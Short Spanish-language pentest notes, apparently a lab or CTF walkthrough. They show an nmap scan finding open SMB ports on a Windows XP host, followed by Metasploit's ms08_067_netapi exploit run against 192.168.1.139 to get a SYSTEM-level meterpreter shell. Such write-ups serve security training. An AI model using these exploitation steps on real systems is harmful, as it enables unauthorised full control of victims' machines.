PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-El escaneo detallado de nmap, descubre, a través de SMB que la versión del sistema operativo es la siguiente:
	-OS: Windows XP (Windows 2000 LAN Manager)

-Buscamos en google y encontramos el siguiente módulo de Metasploit:
	-**exploit/windows/smb/ms08_067_netapi**
	-Este módulo explota la vuln --> **smb-vuln-ms08-067**

-Explotamos la máquina con Metasploit:
	-Módulo a utilizar --> **exploit/windows/smb/ms08_067_netapi**
		-set rhosts 192.168.1.139
		-run
			-meterpreter > getuid
				NT AUTHORITY\SYSTEM (Somo root directamente!!)